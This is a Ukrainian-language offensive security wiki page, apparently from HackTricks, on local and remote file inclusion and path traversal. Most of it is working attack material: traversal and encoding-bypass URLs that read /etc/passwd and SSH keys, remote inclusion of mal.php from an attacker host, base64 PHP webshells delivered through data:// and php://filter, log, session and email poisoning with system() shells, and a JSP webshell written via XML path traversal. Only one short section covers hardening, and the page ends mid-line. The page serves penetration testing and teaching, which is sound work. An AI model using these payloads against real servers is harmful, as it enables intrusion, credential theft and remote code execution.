# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Файл завантажується з віддаленого сервера (Найкраще: ви можете написати код і сервер його виконає). У php це **відключено** за замовчуванням (**allow_url_include**).\
**Local File Inclusion (LFI):** Сервер завантажує локальний файл.

Вразливість виникає, коли користувач якимось чином може контролювати файл, який буде завантажений сервером.

Вразливі **PHP функції**: require, require_once, include, include_once

Цікаве рішення для експлуатації цієї вразливості: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Об'єднавши кілька \*nix LFI списків та додавши більше шляхів, я створив цей:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Спробуйте також змінити `/` на `\`\
Спробуйте також додати `../../../../../`

Список, який використовує кілька технік для знаходження файлу /etc/password (щоб перевірити наявність вразливості), можна знайти [тут](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Комбінація різних wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Спробуйте також змінити `/` на `\`\
Спробуйте також видалити `C:/` і додати `../../../../../`

Список, який використовує кілька технік для знаходження файлу /boot.ini (щоб перевірити наявність вразливості), можна знайти [тут](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Перевірте LFI список linux.

## Базовий LFI та способи обходу

Всі приклади стосуються Local File Inclusion, але можуть також застосовуватися до Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences видаляються нерекурсивно
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass додавання додаткових символів у кінець наданого рядка (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Це **вирішено з PHP 5.4**

### **Кодування**

Ви можете використовувати нестандартні кодування, такі як подвійне URL encode (та інші):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### З існуючої папки

Можливо, back-end перевіряє шлях до папки:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Дослідження директорій файлової системи на сервері

Файлову систему сервера можна рекурсивно досліджувати, щоб ідентифікувати директорії, а не лише файли, застосовуючи певні техніки. Цей процес включає визначення глибини директорії та перевірку наявності конкретних папок. Нижче наведено детальний метод для досягнення цього:

1. **Determine Directory Depth:** Встановіть глибину вашої поточної директорії, успішно отримавши файл `/etc/passwd` (застосовується, якщо сервер на базі Linux). Приклад URL може мати таку структуру, що вказує на глибину три:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Перевірка папок:** Додайте назву підозрілої папки (наприклад, `private`) до URL, потім поверніться до `/etc/passwd`. Додатковий рівень директорії вимагає збільшення глибини на один:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Інтерпретація результатів:** Відповідь сервера вказує, чи існує папка:
- **Помилка / Немає виводу:** Папка `private` ймовірно не існує за вказаним шляхом.
- **Вміст `/etc/passwd`:** Наявність папки `private` підтверджується.
4. **Рекурсивне дослідження:** Знайдені папки можна далі перевіряти на наявність підкаталогів або файлів, використовуючи ту ж саму техніку або традиційні методи Local File Inclusion (LFI).

Щоб досліджувати каталоги в інших місцях файлової системи, відповідно відкоригуйте payload. Наприклад, щоб перевірити, чи містить `/var/www/` каталог `private` (припускаючи, що поточний каталог знаходиться на глибині 3), використайте:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation — метод, який використовується для маніпуляції file paths у веб‑застосунках. Його часто застосовують для доступу до обмежених файлів, обходячи заходи безпеки, що додають додаткові символи в кінець file paths. Мета — сформувати file path так, щоб після модифікації заходом безпеки він і надалі вказував на потрібний файл.

У PHP різні представлення одного file path можуть вважатися еквівалентними через особливості файлової системи. Наприклад:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` трактуються як один і той самий file path.
- Якщо останні 6 символів — `passwd`, додавання `/` (утворюючи `passwd/`) не змінює цільовий файл.
- Аналогічно, якщо до file path додається `.php` (наприклад `shellcode.php`), додавання `/.` у кінці не змінить файл, до якого здійснюється доступ.

Наведені приклади демонструють, як використовувати path truncation для доступу до `/etc/passwd` — поширеної цілі через її чутливий вміст (інформація про облікові записи користувачів):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
У цих сценаріях кількість необхідних переходів може становити близько 2027, але це число може змінюватися залежно від конфігурації сервера.

- **Using Dot Segments and Additional Characters**: Послідовності (`../`) у поєднанні з додатковими сегментами крапок та символами можна використовувати для навігації файловою системою, фактично ігноруючи рядки, які додає сервер.
- **Determining the Required Number of Traversals**: Методом спроб і помилок можна визначити точну кількість послідовностей `../`, необхідних щоб дістатися до кореневого каталогу й потім до `/etc/passwd`, забезпечивши нейтралізацію будь-яких доданих рядків (наприклад `.php`), але при цьому збереження бажаного шляху (`/etc/passwd`).
- **Starting with a Fake Directory**: Це загально прийнята практика — починати шлях із неіснуючого каталогу (наприклад `a/`). Ця техніка використовується як запобіжний захід або щоб виконати вимоги логіки розбору шляху сервером.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

У php це вимкнено за замовчуванням, тому що **`allow_url_include`** встановлено в **Off.** Воно має бути **On**, щоб працювати, і в такому випадку ви можете підключити PHP-файл з вашого сервера і отримати RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Якщо з якоїсь причини **`allow_url_include`** встановлено в **On**, але PHP фільтрує доступ до зовнішніх веб-сторінок, [згідно з цим дописом](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), ви можете, наприклад, використати протокол data з base64, щоб декодувати b64 PHP-код і отримати RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> У попередньому коді фінальна `+.txt` була додана тому, що attacker потребував рядка, який закінчується на `.txt`, тож рядок закінчується ним і після b64 decode ця частина поверне лише сміття, а справжній PHP code буде включений (і, отже, виконаний).
>
> Інший приклад **без використання протоколу `php://`** виглядатиме так:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python кореневий елемент

У python у коді, як у цьому:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Якщо користувач передає **absolute path** в **`file_name`**, **попередній шлях просто видаляється**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Це очікувана поведінка згідно з [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Якщо компонент є абсолютним шляхом, всі попередні компоненти відкидаються, і об'єднання продовжується від компонента з абсолютним шляхом.

## Java: перерахування директорій

Здається, якщо у вас є Path Traversal у Java і ви **запитуєте директорію** замість файлу, то **повертається перелік вмісту директорії**. Це не відбувається в інших мовах (наскільки мені відомо).

## Топ 25 параметрів

Ось список топ 25 параметрів, які можуть бути вразливими до local file inclusion (LFI) (з [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI за допомогою PHP обгорток і протоколів

### php://filter

PHP-фільтри дозволяють виконувати базові операції з **модифікації даних** перед тим, як вони будуть прочитані або записані. Існує 5 категорій фільтрів:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Remove tags from the data (everything between "<" and ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Перетворює в інше кодування (`convert.iconv.<input_enc>.<output_enc>`). Щоб отримати **список усіх кодувань**, що підтримуються, виконайте в консолі: `iconv -l`

> [!WARNING]
> Зловживання фільтром `convert.iconv.*` дозволяє **згенерувати довільний текст**, що може бути корисним для запису довільного тексту або щоб функція на кшталт include обробляла довільний текст. Для додаткової інформації див. [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- Running in php `var_dump(stream_get_filters());` you can find a couple of **unexpected filters**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Частина "php://filter" нечутлива до регістру

### Використання php filters як oracle для читання довільних файлів

[**У цьому дописі**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) пропонується техніка для читання локального файлу без повернення його вмісту від сервера. Ця техніка базується на **boolean exfiltration of the file (char by char) using php filters** як oracle. Це можливо тому, що php filters можуть використовуватись для збільшення тексту настільки, що php викине виняток.

У оригінальному дописі є детальне пояснення техніки, тут — коротке резюме:

- Використати codec **`UCS-4LE`**, щоб залишити провідний символ тексту на початку і зробити розмір рядка експоненційно більшим.
- Це використовується для генерації **дуже великого тексту, коли початкова літера вгадана правильно**, так що php викличе **помилку**
- Фільтр **dechunk** **видалить все, якщо перший символ не є шістнадцятковим**, тому ми можемо визначити, чи перший символ є hex.
- Це, у поєднанні з попереднім (і іншими фільтрами залежно від вгаданої літери), дозволить нам вгадати літеру на початку тексту, спостерігаючи, коли достатньо трансформацій робить її не шістнадцятковим символом. Тому що якщо hex, dechunk його не видалить і початкова бомба викличе помилку php.
- Кодек **convert.iconv.UNICODE.CP930** перетворює кожну літеру в наступну (тому після цього codec: a -> b). Це дозволяє виявити, чи початкова літера — наприклад, `a`, бо якщо застосувати 6 таких codec: a->b->c->d->e->f->g, літера більше не буде шістнадцятковим символом, отже dechunk її не видалить і php-помилка спрацює через множення початкової бомби.
- Використовуючи інші трансформації, як **rot13** на початку, possible to leak інші символи як n, o, p, q, r (і інші codecs можуть бути використані для переміщення інших літер в діапазон hex).
- Коли початковий символ — число, потрібно base64 encode його і leak перші 2 літери, щоб leak число.
- Кінцева проблема — як leak більше ніж початкова літера. Використовуючи фільтри порядку байтів (order memory filters) такі як **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** можна змінити порядок символів і помістити на першу позицію інші літери тексту.
- А щоб отримати further data ітидея в тому, щоб **згенерувати 2 байти junk даних на початку** за допомогою **convert.iconv.UTF16.UTF16**, застосувати **UCS-4LE** щоб вони **pivot з наступними 2 байтами**, та d**elete дані до junk даних** (це видалить перші 2 байти початкового тексту). Продовжувати це робити, поки не досягнете бажаного біта для leak.

У дописі також був leaked інструмент для автоматизації: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Цей wrapper дозволяє отримати доступ до file descriptors, які процес має відкритими. Потенційно корисно для exfiltrate вмісту відкритих файлів:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Ви також можете використовувати **php://stdin, php://stdout and php://stderr** для доступу до **file descriptors 0, 1 and 2** відповідно (не впевнений, як це може бути корисним у атаці)

### zip:// and rar://

Завантажте Zip або Rar файл з PHPShell всередині та отримайте до нього доступ.\
Щоб мати змогу зловживати протоколом rar, його **need to be specifically activated**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Зверніть увагу, що цей протокол обмежений конфігураціями php **`allow_url_open`** та **`allow_url_include`**

### expect://

Expect має бути активований. Ви можете виконувати код за допомогою цього:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Вкажіть payload у POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Файл `.phar` може бути використаний для виконання PHP-коду, коли вебзастосунок використовує функції, такі як `include`, для завантаження файлів. Наведений нижче фрагмент PHP-коду демонструє створення `.phar` файлу:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Щоб скомпілювати файл `.phar`, слід виконати таку команду:
```bash
php --define phar.readonly=0 create_path.php
```
Після виконання буде створено файл з іменем `test.phar`, який потенційно може бути використаний для експлуатації вразливостей Local File Inclusion (LFI).

У випадках, коли LFI лише читає файл без виконання PHP-коду всередині — через такі функції, як `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` або `filesize()` — може бути спроба експлуатації вразливості deserialization. Ця вразливість пов'язана з читанням файлів за допомогою протоколу `phar`.

Для детального розуміння експлуатації вразливостей deserialization у контексті файлів `.phar`, зверніться до документа, наведеного нижче:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Було можливо зловживати **any arbitrary file read from PHP that supports php filters** щоб отримати RCE. Детальний опис можна [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Коротко: **3 byte overflow** в PHP heap був використаний, щоб **alter the chain of free chunks** певного розміру, що дозволило **write anything in any address**, тому був доданий хук, який викликає **`system`**.\
Було можливим alloc chunks певних розмірів, зловживаючи додатковими php filters.

### Більше протоколів

Перевірте інші можливі[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Запис у пам'ять або у тимчасовий файл (не впевнено, як це може бути корисно у file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Доступ до локальної файлової системи
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Доступ до HTTP(s) URL-адрес
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Доступ до FTP(s) URL-адрес
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (Воно не повертає нічого придатного для виведення, тому не дуже корисне тут)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Не корисно для читання довільних файлів)

## LFI via PHP's 'assert'

Ризики Local File Inclusion (LFI) у PHP особливо високі при роботі з функцією 'assert', яка може виконувати код, що міститься у рядках. Це особливо проблематично, якщо ввод, що містить символи обходу директорій, такі як "..", перевіряється, але не належним чином фільтрується.

Наприклад, PHP-код може бути створений, щоб запобігати directory traversal таким чином:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Хоча це має на меті зупинити traversal, воно ненавмисно створює вектор для code injection. Щоб скористатися цим для читання вмісту файлу, зловмисник може використати:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Аналогічно, для виконання довільних системних команд можна використовувати:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ця техніка релевантна у випадках, коли ви **контролюєте** **file path** для **PHP function**, яка буде **access a file**, але ви не побачите вміст файлу (наприклад простий виклик **`file()`**), оскільки вміст не відображається.

В [**цьому чудовому пості**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) пояснюється, як blind path traversal можна зловживати через PHP filter, щоб **exfiltrate the content of a file via an error oracle**.

У підсумку, техніка використовує **"UCS-4LE" encoding**, щоб зробити вміст файлу настільки **великим**, що **PHP function opening** файл викличе **error**.

Потім, щоб leak перший символ, використовується фільтр **`dechunk`** разом з іншими, такими як **base64** або **rot13**, і нарешті використовуються фільтри **convert.iconv.UCS-4.UCS-4LE** та **convert.iconv.UTF16.UTF-16BE**, щоб **place other chars at the beggining and leak them**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Коли серверний код, який приймає/завантажує файли, будує шлях призначення з даних під контролем користувача (наприклад, filename або URL) без канонізації та валідації, сегменти `..` і абсолютні шляхи можуть вийти за межі призначеної директорії і спричинити arbitrary file write. Якщо ви можете помістити payload у web-exposed directory, зазвичай отримуєте unauthenticated RCE, закинувши webshell.

Типовий робочий процес експлуатації:
- Виявити write primitive в endpoint або background worker, який приймає path/filename і записує вміст на диск (наприклад, message-driven ingestion, XML/JSON command handlers, ZIP extractors тощо).
- Визначити web-exposed directories. Поширені приклади:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Сконструювати traversal path, який виходить з призначеного storage directory у webroot, і включити в нього вміст webshell.
- Відкрити dropped payload у браузері та виконати команди.

Примітки:
- Уразливий сервіс, що виконує запис, може слухати на порту, відмінному від HTTP (наприклад, JMF XML listener на TCP 4004). Головний веб-портал (інший порт) пізніше буде слугувати вашому payload.
- У Java-стеках ці операції запису файлів часто імплементовані простим конкатенуванням `File`/`Paths`. Відсутність канонізації/allow-listing — основний недолік.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Заходи жорсткого захисту, які нейтралізують цей клас вразливостей:
- Нормалізуйте шлях до канонічної форми і переконайтеся, що він є нащадком дозволеного базового каталогу.
- Відхиляйте будь-який шлях, що містить `..`, абсолютні корені або літеру диска; надавайте перевагу згенерованим іменам файлів.
- Запускайте процес запису від імені облікового запису з низькими привілеями і відокремлюйте каталоги для запису від коренів, що обслуговуються.

## Remote File Inclusion

Пояснювалося раніше, [**follow this link**](#remote-file-inclusion).

### Через Apache/Nginx log file

Якщо сервер Apache або Nginx **вразливий до LFI** у функції include, ви можете спробувати отримати доступ до **`/var/log/apache2/access.log` або `/var/log/nginx/access.log`**, записати в **user agent** або в **GET parameter** php shell, наприклад **`<?php system($_GET['c']); ?>`**, і включити цей файл

> [!WARNING]
> Зверніть увагу, що **якщо ви використовуєте двійні лапки** для shell замість **одинарних**, двійні лапки будуть змінені на рядок "_**quote;**_", **PHP викине помилку** там і **нічого іншого не буде виконано**.
>
> Також переконайтеся, що ви **правильно формуєте payload**, інакше PHP видаватиме помилку щоразу, коли спробує завантажити лог-файл, і у вас не буде другої можливості.

Це також може бути зроблено в інших логах, але **обережно,** код всередині логів може бути URL encoded і це може зіпсувати Shell. Заголовок **authorisation "basic"** містить "user:password" у Base64 і він декодується всередині логів. PHPShell could be inserted inside this header.\ Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Через Email

**Надішліть лист** to a internal account (user@localhost) containing your PHP payload like `<?php echo system($_REQUEST["cmd"]); ?>` and try to include to the mail of the user with a path like **`/var/mail/<USERNAME>`** or **`/var/spool/mail/<USERNAME>`**

### Через /proc/*/fd/*

1. Завантажте багато shells (for example : 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), with $PID = PID of the process (can be brute forced) and $FD the file descriptor (can be brute forced too)

### Через /proc/self/environ

Як із лог-файлом, відправте payload в User-Agent — він відобразиться у файлі /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Через upload

Якщо ви можете upload файл, просто inject the shell payload у нього (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Щоб файл залишався читабельним, найкраще вбудовувати інформацію в метадані зображень/doc/pdf

### Через Zip file upload

Завантажте ZIP-файл, що містить стиснутий PHP shell, і отримайте доступ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Через PHP sessions

Перевірте, чи сайт використовує PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
У PHP ці сесії зберігаються в _/var/lib/php5/sess\\_\[PHPSESSID]\_ файлах
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Встановіть cookie на `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Використайте LFI, щоб включити PHP-файл сесії
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Через ssh

Якщо ssh активний, перевірте, який користувач використовується (/proc/self/status & /etc/passwd) та спробуйте отримати доступ до **\<HOME>/.ssh/id_rsa**

### **Через** **vsftpd** _**logs**_

Логи FTP-сервера vsftpd знаходяться в _**/var/log/vsftpd.log**_. У випадку, якщо існує вразливість Local File Inclusion (LFI) і є доступ до відкритого vsftpd сервера, можна розглянути наступні кроки:

1. Інжектуйте PHP payload у поле username під час процесу входу.
2. Після інжекції використайте LFI, щоб отримати логи сервера з _**/var/log/vsftpd.log**_.

### Через php base64 filter (using base64)

Як показано в [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) статті, PHP base64 filter просто ігнорує символи, що не є base64. Ви можете використати це, щоб обійти перевірку розширення файлу: якщо ви передасте base64, який закінчується на ".php", він просто ігноруватиме "." і додасть "php" до base64. Ось приклад payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Через php filters (no file needed)

Цей [**розбір**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) пояснює, що ви можете використовувати **php filters to generate arbitrary content** як вихід. Це по суті означає, що ви можете **generate arbitrary php code** для include **без необхідності записувати** його у файл.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Через segmentation fault

**Завантажте** файл, який буде збережено як **тимчасовий** у `/tmp`, потім у **тому ж запиті** викличте **segmentation fault**, і тоді **тимчасовий файл не буде видалено** і ви зможете його знайти.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Через збереження тимчасових файлів Nginx

Якщо ви знайшли **Local File Inclusion** і **Nginx** працює перед PHP, ви можете отримати RCE за допомогою наступної техніки:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Через PHP_SESSION_UPLOAD_PROGRESS

Якщо ви знайшли **Local File Inclusion**, навіть якщо у вас **немає сесії** і `session.auto_start` встановлено в `Off`. Якщо ви передасте **`PHP_SESSION_UPLOAD_PROGRESS`** в **multipart POST** даних, PHP **увімкне сесію за вас**. Ви можете зловживати цим, щоб отримати RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Через завантаження тимчасових файлів у Windows

Якщо ви знайшли **Local File Inclusion** і сервер працює на **Windows**, можливо, ви зможете отримати RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Через `pearcmd.php` + URL args

Як [**пояснено в цьому дописі**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), скрипт `/usr/local/lib/phppearcmd.php` існує за замовчуванням у php docker images. Більше того, можна передавати аргументи скрипту через URL, бо вказано, що якщо URL-параметр не має `=`, він має використовуватися як аргумент. Див. також [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) і [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Наступний запит створює файл у `/tmp/hello.php` з вмістом `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Наведене зловживає CRLF vuln, щоб отримати RCE (з [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
